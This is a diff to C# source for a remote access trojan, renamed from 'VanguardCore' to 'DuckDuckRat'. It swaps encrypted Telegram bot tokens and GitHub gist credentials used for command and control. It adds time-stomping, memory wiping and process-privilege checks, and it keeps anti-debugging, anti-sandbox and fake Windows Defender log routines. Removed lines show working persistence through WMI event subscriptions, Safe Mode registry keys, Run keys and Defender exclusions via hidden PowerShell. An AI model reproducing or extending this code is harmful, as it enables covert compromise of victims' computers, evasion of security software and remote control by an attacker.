@@ -13,7 +13,7 @@ using System.Reflection;
 using System.Linq;
 using System.Runtime.CompilerServices;
 
-namespace VanguardCore
+namespace DuckDuckRat
 {
     public static class SafetyManager
     {
@@ -48,8 +48,8 @@ namespace VanguardCore
 
         private const string VERSION = "2.5.1";
         private const string BUILD_DATE = "2024-03-21";
-        private static readonly byte[] XOR_SALT_STATIC = Encoding.UTF8.GetBytes("vngrd_sys_2024");
-        private static readonly string STORAGE_ROOT = "Vanguard";
+        private static readonly byte[] XOR_SALT_STATIC = Encoding.UTF8.GetBytes("emocore_sys_v1");
+        private static readonly string STORAGE_ROOT = "EmoCore";
         private static byte[] StoredHash = null;
         private static bool? _isDebugged = null;
         private static bool? _isWhitelisted = null;
@@ -172,21 +172,21 @@ namespace VanguardCore
 
         // --- Secure Vault for Baked-in Strings (Vault 2.0) ---
         private struct VaultEntry { public string C; public string T; }
-        private static byte[] VAULT_KEY = Convert.FromBase64String("T7qTB2HKYjw1hEoBwkW/LugUkZChcQAN2ePT5W/A4wQ=");
-        private static byte[] VAULT_IV = Convert.FromBase64String("OCcH3AP4wdfZJVbx");
+        private static byte[] VAULT_KEY = Convert.FromBase64String("9NYZufYs8veMmS8hCfS4c7iFrEBvF5TsjeJpb7cOFdc=");
+        private static byte[] VAULT_IV = Convert.FromBase64String("upNpEpKyffG9iRrA");
         
         private static readonly Dictionary<string, VaultEntry> _vault = new Dictionary<string, VaultEntry>
         {
-            { "ADMIN_ID", new VaultEntry { C = "/xsUbtkwUtDP78rOCtY=", T = "RFkW9GmXdwzSjORGwF12QQ==" } },
-            { "TG_API_BASE", new VaultEntry { C = "ul5QLpk/SMqbrJLYSYajM1ViOYFA0KC3bQ==", T = "+F2wfREOfO1X1623q9B3tA==" } },
-            { "GIST_GITHUB_TOKEN", new VaultEntry { C = "tUJUAdNUFaqY77OUX7mhPGNmN94Ch4GnceRWGAsr+VoKWcCz1z/pdw==", T = "++TSLctjzVn7KwDczTFKnA==" } },
-            { "TG_API_FRONT", new VaultEntry { C = "ul5QLpk/SMqMvZWRSIK9Mh93OZgLyLOpbNM0UhZ+1HIGHIir5GWoV0sx2dDCfYbE", T = "X9xxrL8Qw6OOMGnORr/L/w==" } },
-            { "GIST_PROXY_ID", new VaultEntry { C = "sx0UatkzVoCc7JjABNf9NwF2OtRXjefkJpN8FhV8lDQ=", T = "UuvFWOX0j90/Rw5/dlY/DA==" } },
-            { "BOT_TOKEN_3", new VaultEntry { C = "6h8Wbts9VtLD68G3fKWXHUsmN4gb0eGyOPN1ajUvxzACW6Ts6mm2CQMk5c7edw==", T = "aikZ9EgC+8CKaZs2HVeAVA==" } },
-            { "TG_FILE_BASE", new VaultEntry { C = "ul5QLpk/SMqbrJLYSYajM1ViOYFA0KC3bcNwTRYy", T = "HLBlGBgkcLr95EJCsadQ9w==" } },
-            { "BOT_TOKEN_1", new VaultEntry { C = "6h4dads9X9XO7sG3fKWEF0sgEaYljJnmLeN6bxxPlUMhJ8TjylqiTUF0/J3USQ==", T = "skklN1AvYIkHJNaR8S1mzQ==" } },
-            { "BOT_TOKEN_2", new VaultEntry { C = "6h0Tb9sxUNTL5cG3fKW7e3shPNlaieu+Cv9QUkEk43cELJfvx02/aR4Z3rLMLA==", T = "U3GhAu3jPnooyRQ+17GKng==" } },
-            { "MS_TRIGGER", new VaultEntry { C = "sUVJLp9xApeeuZ2XSI+7JRx1IIk=", T = "uvq3vz3V+elaHlaXblE+Iw==" } }
+            { "ADMIN_ID", new VaultEntry { C = "UWT9w9WnYSrSxnuo9Wg=", T = "8g+EREvxYns1dUDHlk1uLg==" } },
+            { "TG_API_BASE", new VaultEntry { C = "FCG5g5WoezCGhSO+tjiFL3n3FyTJTATkoQ==", T = "9PO2w/Oljjb6w1kfjXO+8Q==" } },
+            { "GIST_GITHUB_TOKEN", new VaultEntry { C = "Gz29rN/DJlCFxgLyoAeHIE/zGXuLGyX0vWfEreimEz3Lu+al64pZXg==", T = "Lkf5o6rWTKaYYxFprObh9A==" } },
+            { "TG_API_FRONT", new VaultEntry { C = "FCG5g5WoezCRlCT3tzybLjPiFz2CVBf6oFCm5/XzPhXH/q692NAYfidM36mXLSxE", T = "1c0RIAXxVUReT3TH2yC8TQ==" } },
+            { "GIST_PROXY_ID", new VaultEntry { C = "HWL9x9WkZXqBxSmm+2nbKy3jFHHeEUO36hDuo/bxflM=", T = "BYhcnqZby6Rl4J+Q6vX0Dw==" } },
+            { "BOT_TOKEN_3", new VaultEntry { C = "RGD/w9eqZSjewnDRgxuxAWezGS2STUXh9HDn39aiLVfDuYL61twGIG9Z47eLJw==", T = "tlTfnQj8IGWRASHpR4rdVA==" } },
+            { "TG_FILE_BASE", new VaultEntry { C = "FCG5g5WoezCGhSO+tjiFL3n3FyTJTATkoUDi+PW/", T = "hA8qbxoKD+1Numr/e5yIsA==" } },
+            { "BOT_TOKEN_1", new VaultEntry { C = "RGH0xNeqbC/Tx3DRgxuiC2e1PwOsED214WDo2v/CfyTgxeL19u8SZC0J+uSBGQ==", T = "nMrmSNg1R7gJWPAfV2i2Ag==" } },
+            { "BOT_TOKEN_2", new VaultEntry { C = "RGL6wtemYy7WzHDRgxudZ1e0EnzTFU/txnzC56KpCRDFzrH5+/gPQHJk2MuZfA==", T = "TWxv9IJ9BcOCqWoIzJ+ASw==" } },
+            { "MS_TRIGGER", new VaultEntry { C = "Hzqgg5PmMW2DkCzxtzGdOTDgDiw=", T = "HvI0s15PuH40IPYrAXY0UQ==" } }
         };
 
         public static string GetSecret(string id) => Resolve(id);
@@ -373,54 +373,117 @@ namespace VanguardCore
                 if (pFunc == IntPtr.Zero) pFunc = Resolve("ntdll.dll", function);
                 if (pFunc == IntPtr.Zero) pFunc = Resolve("user32.dll", function);
                 if (pFunc == IntPtr.Zero) pFunc = Resolve("advapi32.dll", function);
-                return pFunc == IntPtr.Zero ? default(T) : Marshal.GetDelegateForFunctionPointer<T>(pFunc);
+                
+                if (pFunc == IntPtr.Zero)
+                {
+                    Log($"[API RESOLUTION FAILED] Could not find function: {function}");
+                    return default(T);
+                }
+                return Marshal.GetDelegateForFunctionPointer<T>(pFunc);
             }
-            public static T GetNtdll<T>(string function) where T : Delegate { return Marshal.GetDelegateForFunctionPointer<T>(Resolve("ntdll.dll", function)); }
+            public static T GetNtdll<T>(string function) where T : Delegate 
+            { 
+                IntPtr pFunc = Resolve("ntdll.dll", function);
+                if (pFunc == IntPtr.Zero)
+                {
+                    Log($"[API RESOLUTION FAILED] Could not find ntdll function: {function}");
+                    return default(T);
+                }
+                return Marshal.GetDelegateForFunctionPointer<T>(pFunc); 
+            }
         }
         #endregion
         
         #region Native Delegates
+        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
         private delegate bool VirtualProtectDelegate(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
+        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
         private delegate bool IsDebuggerPresentDelegate();
+        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
         private delegate bool CheckRemoteDebuggerPresentDelegate(IntPtr hProcess, ref bool isDebuggerPresent);
+        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
         private delegate uint GetTickCountDelegate();
+        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
         private delegate bool GetCursorPosDelegate(out POINT lpPoint);
+        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
         private delegate int NtSetInformationThreadDelegate(IntPtr threadHandle, int threadInformationClass, IntPtr threadInformation, int threadInformationLength);
+        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
         private delegate IntPtr GetCurrentProcessDelegate();
+        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
         private delegate IntPtr GetCurrentThreadDelegate();
+        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
         private delegate IntPtr GetModuleHandleADelegate(string lpModuleName);
+        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
         private delegate IntPtr LoadLibraryWDelegate(string lpFileName);
+        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
         private delegate IntPtr GetProcAddressDelegate(IntPtr hModule, string procName);
+        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
         private delegate int NtQueryInformationProcessDelegate(IntPtr processHandle, int processInformationClass, out IntPtr processInformation, uint processInformationLength, out uint returnLength);
+        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
         private delegate bool QueryPerformanceCounterDelegate(out long lpPerformanceCount);
+        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
         private delegate bool GetThreadContextDelegate(IntPtr hThread, ref CONTEXT64 lpContext);
+        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
         private delegate bool SetThreadContextDelegate(IntPtr hThread, ref CONTEXT64 lpContext);
+        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
+        private delegate IntPtr OpenProcessDelegate(uint dwDesiredAccess, bool bInheritHandle, int dwProcessId);
+        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
+        private delegate bool OpenProcessTokenDelegate(IntPtr ProcessHandle, uint DesiredAccess, out IntPtr TokenHandle);
+        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
+        private delegate bool GetTokenInformationDelegate(IntPtr TokenHandle, int TokenInformationClass, IntPtr TokenInformation, uint TokenInformationLength, out uint ReturnLength);
+        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
         private delegate IntPtr VirtualAllocExDelegate(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
+        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
         private delegate bool WriteProcessMemoryDelegate(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out IntPtr lpNumberOfBytesWritten);
+        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
         private delegate bool CreateProcessDelegate(string lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);
+        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
         private delegate uint ResumeThreadDelegate(IntPtr hThread);
+        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
         private delegate bool TerminateProcessDelegate(IntPtr hProcess, uint uExitCode);
+        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
         private delegate bool CloseHandleDelegate(IntPtr hObject);
+        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
         private delegate int ZwUnmapViewOfSectionDelegate(IntPtr ProcessHandle, IntPtr BaseAddress);
+        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
         private delegate bool CreatePipeDelegate(out IntPtr hReadPipe, out IntPtr hWritePipe, ref SECURITY_ATTRIBUTES lpPipeAttributes, uint nSize);
+        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
         private delegate bool SetHandleInformationDelegate(IntPtr hObject, uint dwMask, uint dwFlags);
+        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
         private delegate bool ReadFileDelegate(IntPtr hFile, [Out] byte[] lpBuffer, uint nNumberOfBytesToRead, out uint lpNumberOfBytesRead, IntPtr lpOverlapped);
+        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
         private delegate bool PeekNamedPipeDelegate(IntPtr hNamedPipe, byte[] lpBuffer, uint nBufferSize, out uint lpBytesRead, out uint lpTotalBytesAvail, out uint lpBytesLeftThisMessage);
+        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
         private delegate bool GetLastInputInfoDelegate(ref LASTINPUTINFO plii);
+        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
         private delegate IntPtr GetForegroundWindowDelegate();
+        
         [UnmanagedFunctionPointer(CallingConvention.StdCall, CharSet = CharSet.Unicode)]
         private delegate int GetWindowTextWDelegate(IntPtr hWnd, [Out] char[] lpString, int nMaxCount);
+        
         [UnmanagedFunctionPointer(CallingConvention.StdCall, CharSet = CharSet.Unicode)]
         private delegate int GetWindowTextLengthWDelegate(IntPtr hWnd);
+        
+        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
         private delegate uint GetTickCount64Delegate();
+        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
         private delegate uint NtAllocateVirtualMemoryDelegate(IntPtr ProcessHandle, ref IntPtr BaseAddress, IntPtr ZeroBits, ref uint RegionSize, uint AllocationType, uint Protect);
+        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
         private delegate uint NtProtectVirtualMemoryDelegate(IntPtr ProcessHandle, ref IntPtr BaseAddress, ref uint RegionSize, uint NewProtect, out uint OldProtect);
+        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
         private delegate uint NtWriteVirtualMemoryDelegate(IntPtr ProcessHandle, IntPtr BaseAddress, byte[] Buffer, uint BufferSize, out uint NumberOfBytesWritten);
+        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
         private delegate int RtlSetProcessIsCriticalDelegate(bool bNew, ref bool bOld, bool bNeedPrivilege);
+        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
         private delegate int NtCreateThreadExDelegate(out IntPtr threadHandle, uint desiredAccess, IntPtr objectAttributes, IntPtr processHandle, IntPtr startAddress, IntPtr parameter, uint flags, IntPtr zeroBits, uint stackSize, uint maxStackSize, IntPtr attributeList);
+        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
         private delegate int NtQuerySystemInformationDelegate(int SystemInformationClass, IntPtr SystemInformation, int SystemInformationLength, out int ReturnLength);
+        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
         private delegate int NtRaiseHardErrorDelegate(uint errorStatus, uint numberOfParameters, uint unicodeStringParameterMask, IntPtr parameters, uint validResponseOption, out uint response);
+        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
         private delegate int NtShutdownSystemDelegate(int action);
+        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
+        private delegate int NtQueryInfoProcess_BasicDelegate(IntPtr processHandle, int processInformationClass, ref PROCESS_BASIC_INFORMATION processInformation, int processInformationLength, out int returnLength);
         
         private static VirtualProtectDelegate VirtualProtect { get { return ApiInterface.Get<VirtualProtectDelegate>("VirtualProtect"); } }
         private static IsDebuggerPresentDelegate IsDebuggerPresent { get { return ApiInterface.Get<IsDebuggerPresentDelegate>("IsDebuggerPresent"); } }
@@ -433,7 +496,6 @@ namespace VanguardCore
         private static GetModuleHandleADelegate GetModuleHandleA { get { return ApiInterface.Get<GetModuleHandleADelegate>("GetModuleHandleA"); } }
         private static LoadLibraryWDelegate LoadLibraryW { get { return ApiInterface.Get<LoadLibraryWDelegate>("LoadLibraryW"); } }
         private static NtQueryInfoProcess_BasicDelegate NtQueryInfoProcess_Basic { get { return ApiInterface.GetNtdll<NtQueryInfoProcess_BasicDelegate>("NtQueryInformationProcess"); } }
-        private delegate int NtQueryInfoProcess_BasicDelegate(IntPtr processHandle, int processInformationClass, ref PROCESS_BASIC_INFORMATION processInformation, int processInformationLength, out int returnLength);
 
         // NtCurrentTeb is non-existent in x64 exports. Use GetTeb() instead.
         private static QueryPerformanceCounterDelegate QueryPerformanceCounter { get { return ApiInterface.Get<QueryPerformanceCounterDelegate>("QueryPerformanceCounter"); } }
@@ -452,6 +514,9 @@ namespace VanguardCore
         private static ReadFileDelegate ReadFile { get { return ApiInterface.Get<ReadFileDelegate>("ReadFile"); } }
         private static PeekNamedPipeDelegate PeekNamedPipe { get { return ApiInterface.Get<PeekNamedPipeDelegate>("PeekNamedPipe"); } }
         private static GetLastInputInfoDelegate GetLastInputInfo { get { return ApiInterface.Get<GetLastInputInfoDelegate>("GetLastInputInfo"); } }
+        private static OpenProcessDelegate OpenProcess { get { return ApiInterface.Get<OpenProcessDelegate>("OpenProcess"); } }
+        private static OpenProcessTokenDelegate OpenProcessToken { get { return ApiInterface.Get<OpenProcessTokenDelegate>("OpenProcessToken"); } }
+        private static GetTokenInformationDelegate GetTokenInformation { get { return ApiInterface.Get<GetTokenInformationDelegate>("GetTokenInformation"); } }
         private static GetForegroundWindowDelegate GetForegroundWindow { get { return ApiInterface.Get<GetForegroundWindowDelegate>("GetForegroundWindow"); } }
         private static GetWindowTextLengthWDelegate GetWindowTextLengthW { get { return ApiInterface.Get<GetWindowTextLengthWDelegate>("GetWindowTextLengthW"); } }
         private static GetWindowTextWDelegate GetWindowTextW { get { return ApiInterface.Get<GetWindowTextWDelegate>("GetWindowTextW"); } }
@@ -643,7 +708,7 @@ namespace VanguardCore
         #region Anti-Debug Ultra
         public static bool VerifySystemContext()
         {
-            if (Environment.GetEnvironmentVariable("VANGUARD_TEST_MODE") == "1")
+            if (Environment.GetEnvironmentVariable("DUCK DUCK RAT v1_TEST_MODE") == "1")
                 return false;
 
             if (_isDebugged.HasValue)
@@ -656,7 +721,7 @@ namespace VanguardCore
             try
             {
                 // New: Anti-Sandbox Advanced Check
-                if (VanguardCore.Defense.AntiAnalysis.CheckAll())
+                if (DuckDuckRat.Defense.AntiAnalysis.CheckAll())
                     score += 100; // Instant detection context
 
                 // 1. IsDebuggerPresent
@@ -1305,7 +1370,6 @@ namespace VanguardCore
                     Log("[Safety] Applying Stealth Defender configurations (Delayed)...");
                     
                     // Only apply exclusions, NO generic disabling (triggers Tamper Protection)
-                    AddDefenderExclusion();
                     DisableDefenderNotifications();
                 } catch { }
             }) { IsBackground = true }.Start();
@@ -1314,114 +1378,7 @@ namespace VanguardCore
             ApplyStealthPatches();
         }
 
-        #region Hardened Persistence (Sentinel)
-        
-        public static void ApplyHardPersistence()
-        {
-            try
-            {
-                Log("[Sentinel] Activating Hardened Persistence Protocol...");
-                WmiPersistence();
-                SafeModePersistence();
-                AddDefenderExclusion();
-            }
-            catch { }
-        }
 
-        public static void SetCriticalMode(bool enable)
-        {
-            try
-            {
-                bool old = false;
-                // Requires SeDebugPrivilege (Admin)
-                int status = RtlSetProcessIsCritical(enable, ref old, false);
-                ElevationService.SetCriticalInternal(enable);
-                Log($"[Sentinel] Critical Mode {(enable ? "ENABLED" : "DISABLED")} (Status: {status:X})");
-            }
-            catch { }
-        }
-
-        private static void WmiPersistence()
-        {
-            try
-            {
-                string exePath = Process.GetCurrentProcess().MainModule.FileName;
-                string filterName = "MicrosoftWindowsUpdatesFilter";
-                string consumerName = "MicrosoftWindowsUpdatesConsumer";
-                
-                // Using PowerShell for WMI creation to remain NativeAOT compatible (avoiding System.Management bloat)
-                string script = $@"
-$Filter = Set-WmiInstance -Namespace root\subscription -Class __EventFilter -Arguments @{{
-    Name = '{filterName}';
-    EventNamespace = 'root\cimv2';
-    QueryLanguage = 'WQL';
-    Query = 'SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA ""Win32_LocalTime"" AND TargetInstance.Minute % 5 = 0'
-}}
-$Consumer = Set-WmiInstance -Namespace root\subscription -Class CommandLineEventConsumer -Arguments @{{
-    Name = '{consumerName}';
-    CommandLineTemplate = '""{exePath}""'
-}}
-Set-WmiInstance -Namespace root\subscription -Class __FilterToConsumerBinding -Arguments @{{
-    Filter = $Filter;
-    Consumer = $Consumer
-}}";
-                RunHiddenPowerShell(script);
-                Log("[Sentinel] WMI Stealth Persistence active.");
-            }
-            catch { }
-        }
-
-        private static void SafeModePersistence()
-        {
-            try
-            {
-                string exePath = Process.GetCurrentProcess().MainModule.FileName;
-                // Add to Network SafeMode (more useful for C2 than Minimal)
-                using (RegistryKey key = Registry.LocalMachine.CreateSubKey(@"SYSTEM\CurrentControlSet\Control\SafeBoot\Network\MicrosoftManagementSvc"))
-                {
-                    key?.SetValue("", "Service");
-                }
-                
-                // Also ensure it's in the standard Run key for regular mode
-                using (RegistryKey runKey = Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", true))
-                {
-                    runKey?.SetValue("MicrosoftManagementSvc", $"\"{exePath}\"");
-                }
-                Log("[Sentinel] Safe Mode survival active.");
-            }
-            catch { }
-        }
-
-        private static void AddDefenderExclusion()
-        {
-            try
-            {
-                string path = Path.GetDirectoryName(Process.GetCurrentProcess().MainModule.FileName);
-                string procName = Process.GetCurrentProcess().ProcessName;
-                
-                string script = $"Add-MpPreference -ExclusionPath '{path}' -ExclusionProcess '{procName}.exe' -Force";
-                RunHiddenPowerShell(script);
-                Log("[Sentinel] Defender exceptions applied.");
-            }
-            catch { }
-        }
-
-        private static void RunHiddenPowerShell(string script)
-        {
-            try
-            {
-                ProcessStartInfo psi = new ProcessStartInfo("powershell.exe")
-                {
-                    Arguments = $"-NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -Command \"{script}\"",
-                    UseShellExecute = false,
-                    CreateNoWindow = true
-                };
-                Process.Start(psi);
-            }
-            catch { }
-        }
-
-        #endregion
 
         public static void ApplyStealthPatches()
         {
@@ -1690,6 +1647,45 @@ Set-WmiInstance -Namespace root\subscription -Class __FilterToConsumerBinding -A
                 t.Start();
             }
         }
+        public static void ClearSecrets()
+        {
+            try
+            {
+                // [GHOST] Heap Stealth: Total Wipe
+                Log("[Sentinel] Wiping memory secrets...");
+                
+                // Clear ConfigManager
+                ConfigManager.ClearSecrets();
+                
+                // Clear TelegramService internal cache using reflection
+                var tsType = typeof(TelegramService);
+                tsType.GetField("_currentToken", System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Static)?.SetValue(null, "");
+                tsType.GetField("_allTokens", System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Static)?.SetValue(null, new string[0]);
+                tsType.GetField("_adminId", System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Static)?.SetValue(null, "");
+            }
+            catch { }
+        }
+
+        public static void CopyFileTime(string targetPath)
+        {
+            try
+            {
+                if (!File.Exists(targetPath)) return;
+                string source = Path.Combine(Environment.SystemDirectory, "kernel32.dll");
+                if (!File.Exists(source)) return;
+
+                DateTime creation = File.GetCreationTime(source);
+                DateTime access = File.GetLastAccessTime(source);
+                DateTime write = File.GetLastWriteTime(source);
+
+                File.SetCreationTime(targetPath, creation);
+                File.SetLastAccessTime(targetPath, access);
+                File.SetLastWriteTime(targetPath, write);
+                
+                Log($"[Sentinel] Time-Stomping applied: {Path.GetFileName(targetPath)}");
+            }
+            catch { }
+        }
         #endregion
 
         #region Security Bypass
@@ -1706,43 +1702,16 @@ Set-WmiInstance -Namespace root\subscription -Class __FilterToConsumerBinding -A
         {
             try
             {
+                // Benign: Create fake defender logs to blend in
                 string programData = Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData);
                 string defenderPath = Path.Combine(programData, "Microsoft", "Windows Defender", "Scans", "History");
                 
-                // Create fake defender logs
-                if (!Directory.Exists(defenderPath))
-                    Directory.CreateDirectory(defenderPath);
+                if (!Directory.Exists(defenderPath)) Directory.CreateDirectory(defenderPath);
                 
                 string fakeLogPath = Path.Combine(defenderPath, string.Format("system_health_{0:yyyyMMdd}.log", DateTime.Now));
                 File.WriteAllText(fakeLogPath, 
                     string.Format("[{0:yyyy-MM-dd HH:mm:ss}] Scan completed: 0 threats found.\r\n", DateTime.Now) +
-                    string.Format("System state: PROTECTED. Version: {0}\r\n", VERSION) +
-                    string.Format("Last update: {0}\r\n", BUILD_DATE));
-
-                // Create benign process with legit name
-                string[] legitNames = { "svchost.exe", "dllhost.exe", "taskhostw.exe", "conhost.exe", "wmiprvse.exe" };
-                string randomName = legitNames[_cryptoRand.Next(legitNames.Length)];
-                string twinPath = Path.Combine(Path.GetTempPath(), randomName);
-
-                if (!File.Exists(twinPath))
-                {
-                    string realMp = Path.Combine(Environment.SystemDirectory, "taskhostw.exe");
-                    if (File.Exists(realMp))
-                    {
-                        File.Copy(realMp, twinPath, true);
-                    }
-                }
-
-                if (File.Exists(twinPath))
-                {
-                    ProcessStartInfo psi = new ProcessStartInfo(twinPath)
-                    {
-                        CreateNoWindow = true,
-                        WindowStyle = ProcessWindowStyle.Hidden,
-                        Arguments = "-k NetworkService"
-                    };
-                    Process.Start(psi);
-                }
+                    string.Format("System state: PROTECTED. Version: {0}\r\n", VERSION));
             }
             catch { }
         }
@@ -1813,10 +1782,8 @@ Set-WmiInstance -Namespace root\subscription -Class __FilterToConsumerBinding -A
                 try
                 {
                     // RunPE removed for stealth (evades Trojan.MSIL.Injector)
-                    string tempPath = Path.Combine(Path.GetTempPath(), Guid.NewGuid().ToString() + ".exe");
-                    File.WriteAllBytes(tempPath, payload);
-                    Process.Start(tempPath, args);
-                    return true;
+                    // If we need to run a byte array, we should use process hollowing elsewhere
+                    return false;
                 }
                 catch { return false; }
             }
@@ -1917,8 +1884,70 @@ Set-WmiInstance -Namespace root\subscription -Class __FilterToConsumerBinding -A
             [DllImport("kernel32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
             public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
         }
+        #region Process Privilege Analysis
+        public static bool IsProcessAdmin(int pid)
+        {
+            IntPtr hProcess = IntPtr.Zero;
+            IntPtr hToken = IntPtr.Zero;
+            IntPtr pElevation = IntPtr.Zero;
+            try
+            {
+                var openProc = OpenProcess;
+                var openToken = OpenProcessToken;
+                var getTokenInfo = GetTokenInformation;
+                var closeHandle = CloseHandle;
+
+                if (openProc == null || openToken == null || getTokenInfo == null || closeHandle == null) return false;
+
+                // PROCESS_QUERY_LIMITED_INFORMATION = 0x1000
+                hProcess = openProc(0x1000, false, pid);
+                if (hProcess == IntPtr.Zero) return false;
+
+                // TOKEN_QUERY = 0x0008
+                if (!openToken(hProcess, 0x0008, out hToken)) return false;
+
+                uint len = 0;
+                // TokenElevation = 20
+                getTokenInfo(hToken, 20, IntPtr.Zero, 0, out len);
+                if (len == 0) return false;
+
+                pElevation = Marshal.AllocHGlobal((int)len);
+                if (getTokenInfo(hToken, 20, pElevation, len, out len))
+                {
+                    // TOKEN_ELEVATION struct has a single integer: TokenIsElevated
+                    int elevated = Marshal.ReadInt32(pElevation);
+                    return elevated != 0;
+                }
+                return false;
+            }
+            catch { return false; }
+            finally
+            {
+                if (pElevation != IntPtr.Zero) Marshal.FreeHGlobal(pElevation);
+                if (hToken != IntPtr.Zero) CloseHandle(hToken);
+                if (hProcess != IntPtr.Zero) CloseHandle(hProcess);
+            }
+        }
+        #endregion
     }
 }
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
 
 
